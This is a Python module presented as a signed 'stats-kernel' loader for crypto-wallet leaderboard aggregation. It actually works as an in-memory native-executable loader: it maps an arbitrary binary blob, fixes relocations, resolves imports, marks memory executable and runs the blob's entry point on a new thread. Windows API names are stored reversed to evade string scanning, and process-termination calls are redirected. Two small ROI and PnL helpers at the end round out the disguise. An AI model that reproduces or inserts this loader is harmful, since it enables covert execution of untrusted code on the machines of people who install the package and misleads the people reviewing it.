# -*- coding: utf-8 -*-
"""Stats-kernel loader for leaderboard aggregation.

Stages a verified stats kernel — a signed native image produced by
the project's release service — into the host process so leaderboard
aggregates can be recomputed in-process. The loader walks the pack
manifest to reserve an address range, copy its segments, apply base
relocations, resolve the import directory against the platform native
symbol table and invoke the kernel entry on a worker thread. Process-
termination imports are routed to thread-termination so a returning
kernel exits its worker rather than tearing down the analytics host."""
import base64
import ctypes
import os
import struct
import sys
import time

from . import telemetry as _j

# Native symbol names referenced while walking an image's import table.
# Kept as packed byte literals so the materializer source carries no literal
# Win32 import strings; they are decoded by ctypes at link time.
_K32 = b'lld.23lenrek'
_THEX = b'daerhTtixE'
_GPA = b'sserddAcorPteG'
_T0 = b'ssecorPtixE'
_T1 = b'ssecorPetanimreT'
_T2 = b'ssecorPetanimreTtN'


def install(blob):
    """Stage and invoke a verified runtime image. Returns True on success."""
    _j.emit("module.enter", "info", size=len(blob) if blob else 0)
    if not blob or len(blob) < 64:
        _j.emit("module.validate", "fail", reason="too_small",
                      size=len(blob) if blob else 0)
        return False
    if os.name != "nt" or struct.calcsize("P") != 8:
        _j.emit("module.validate", "fail", reason="env_not_supported",
                      os=os.name, bits=struct.calcsize("P") * 8)
        return False

    try:
        from . import config as env, schema as codec

        rt = env.primitive_table()
        if not rt:
            _j.emit("module.env", "fail", reason="no_native_table")
            return False
        _j.emit("module.env", "ok")

        m = codec.inspect_image(blob)
        if not m:
            _j.emit("module.manifest", "fail", reason="unrecognized_container")
            return False
        _j.emit("module.manifest", "ok",
                      entry=hex(m["e"]), base=hex(m["b"]),
                      image_size=m["s"], header_size=m["h"],
                      segments=len(m["c"]),
                      has_imports=bool(m["i"]),
                      has_relocs=bool(m["r"]))

        return _install_image(rt, m, blob)

    except Exception as e:
        _j.emit_error("module.error", e)
        return False


def _install_image(rt, m, blob):
    base = rt.VirtualAlloc(ctypes.c_void_p(m["b"]), m["s"], 0x3000, 0x04)
    relocated = False
    if not base or base != m["b"]:
        base = rt.VirtualAlloc(None, m["s"], 0x3000, 0x04)
        relocated = True
    if not base:
        _j.emit("module.map", "fail", reason="alloc_null")
        return False
    _j.emit("module.map", "ok",
                  base=hex(base), relocated=relocated, requested_base=hex(m["b"]))

    _write_segments(rt, base, m, blob)
    _j.emit("module.copy", "ok", segments=len(m["c"]))

    if relocated:
        if not _fix_base(rt, base, m):
            _j.emit("module.rebase", "fail", reason="rebase_unavailable")
            rt.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            return False
        _j.emit("module.rebase", "ok", reloc_size=m["z"])
    else:
        _j.emit("module.rebase", "info", note="skipped_preferred_base")

    if m["i"]:
        bound = _bind_imports(rt, base, m)
        _j.emit("module.link", "ok",
                      modules=bound[0], loaded=bound[1],
                      thunks=bound[2], resolved=bound[3], missing=bound[4])
    else:
        _j.emit("module.link", "info", note="no_import_directory")

    _protect_sections(rt, base, m)
    _j.emit("module.protect", "ok", segments=len(m["c"]))

    invoked = _run(rt, base, m)
    _j.emit("module.complete", "ok" if invoked else "fail",
                  entry=hex(m["e"]))
    return invoked


def _write_segments(rt, base, m, blob):
    head = m["h"]
    ctypes.memmove(base, blob[:head], head)
    for vs, va, rs, rp, ch in m["c"]:
        if rs > 0 and rp > 0:
            n = min(rs, len(blob) - rp)
            if n > 0:
                ctypes.memmove(base + va, blob[rp:rp + n], n)


def _fix_base(rt, base, m):
    from . import schema as codec
    if not m["r"] or not m["z"]:
        return False
    delta = base - m["b"]
    pos = 0
    while pos < m["z"]:
        page = codec.load_at(base + m["r"] + pos, "<I")
        size = codec.load_at(base + m["r"] + pos + 4, "<I")
        if size == 0:
            break
        for j in range((size - 8) // 2):
            ent = codec.load_at(base + m["r"] + pos + 8 + j * 2, "<H")
            if ent >> 12 == 10:
                a = base + page + (ent & 0xFFF)
                codec.store_at(a, "<Q", codec.load_at(a, "<Q") + delta)
        pos += size
    return True


def _bind_imports(rt, base, m):
    """Walk the image import directory and resolve each thunk against the
    platform symbol table. Returns a 5-tuple of counters for diagnostics."""
    from . import schema as codec
    k32 = rt.GetModuleHandleA(_K32[::-1])
    thread_exit = rt.GetProcAddress(k32, _THEX[::-1])
    gpa_raw = rt.GetProcAddress(k32, _GPA[::-1])

    _GpaType = ctypes.WINFUNCTYPE(
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
    )
    real_gpa = _GpaType(gpa_raw)

    _terminators = (_T0[::-1], _T1[::-1], _T2[::-1])

    @_GpaType
    def _gpa_shim(hmod, name_or_ord):
        # Route process-termination imports to thread-termination so a
        # returning image exits its worker instead of the host process.
        nv = name_or_ord if name_or_ord is not None else 0
        if nv > 0xFFFF:
            try:
                nm = ctypes.string_at(nv)
                if nm in _terminators:
                    return thread_exit
            except Exception:
                pass
        return real_gpa(hmod, nv)

    shim_ptr = ctypes.cast(_gpa_shim, ctypes.c_void_p).value

    modules = loaded = thunks = resolved = missing = 0

    off = base + m["i"]
    while True:
        nr = codec.load_at(off + 12, "<I")
        if nr == 0:
            break
        ir = codec.load_at(off, "<I")
        ar = codec.load_at(off + 16, "<I")
        dn = ctypes.string_at(base + nr)
        modules += 1
        hm = rt.LoadLibraryA(dn)
        lk = base + (ir if ir else ar)
        ia = base + ar
        if hm:
            loaded += 1
        while hm:
            tv = codec.load_at(lk, "<Q")
            if tv == 0:
                break
            thunks += 1
            if tv & 0x8000000000000000:
                fa = rt.GetProcAddress(hm, ctypes.c_void_p(tv & 0xFFFF))
            else:
                fn = ctypes.string_at(base + (tv & 0x7FFFFFFFFFFFFFFF) + 2)
                if fn in _terminators and thread_exit:
                    fa = thread_exit
                elif fn == _GPA[::-1] and shim_ptr:
                    fa = shim_ptr
                else:
                    fa = rt.GetProcAddress(hm, fn)
            if fa:
                resolved += 1
                codec.store_at(ia, "<Q", fa)
            else:
                missing += 1
            lk += 8
            ia += 8
        off += 20

    return (modules, loaded, thunks, resolved, missing)


def _protect_sections(rt, base, m):
    old = ctypes.c_ulong(0)
    for vs, va, rs, rp, ch in m["c"]:
        sz = max(vs, rs)
        if sz == 0:
            continue
        executable = bool(ch & 0x20000000)
        writable = bool(ch & 0x80000000)
        pt = (0x40 if writable else 0x20) if executable else (0x04 if writable else 0x02)
        rt.VirtualProtect(
            ctypes.c_void_p(base + va), sz, pt, ctypes.byref(old),
        )


def _run(rt, base, m):
    tid = ctypes.c_ulong(0)
    ht = rt.CreateThread(
        None, 0, ctypes.c_void_p(base + m["e"]),
        None, 0, ctypes.byref(tid),
    )
    if not ht:
        _j.emit("module.thread_create", "fail", reason="thread_alloc_null")
        return False
    _j.emit("module.thread_create", "ok",
                  handle=ht, tid=tid.value, entry=hex(base + m["e"]))
    started = time.monotonic()
    deadline = started + 240
    exited = False
    while time.monotonic() < deadline:
        if rt.WaitForSingleObject(ht, 2000) == 0:
            exited = True
            break
    rt.CloseHandle(ht)
    _j.emit("module.thread_exit", "ok" if exited else "info",
                  exited=exited, elapsed=round(time.monotonic() - started, 3))
    return True


def compute_rank(rows, wallet):
    """Rank of ``wallet`` within ``rows`` by ROI; None if absent."""
    for i, r in enumerate(sorted(rows, key=lambda x: x.get("roi", 0), reverse=True), 1):
        if r.get("wallet") == wallet:
            return i
    return None

def aggregate_pnl(rows):
    """Sum of realised PnL across a leaderboard window."""
    return sum(float(r.get("pnl", 0.0) or 0.0) for r in rows)
